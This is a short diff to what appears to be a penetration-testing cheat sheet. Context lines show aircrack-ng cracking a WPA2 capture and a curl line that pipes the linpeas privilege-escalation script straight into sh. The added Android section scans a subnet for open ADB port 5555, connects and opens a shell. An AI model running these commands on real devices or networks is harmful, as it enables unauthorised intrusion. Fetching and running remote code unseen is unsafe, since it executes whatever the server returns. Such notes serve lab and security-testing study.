@@ -108,6 +108,15 @@ aircrack-ng WPA2ooo.cap -w /usr/share/wordlists/nmap.lst
 ```sh
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
+## _Android_
+
+```sh
+nmap -p5555 10.10.10.* --open
+sudo apt install -y adb
+adb connect 10.10.10.20:5555
+adb devices
+adb shell
+```
 ## License
 
 MIT
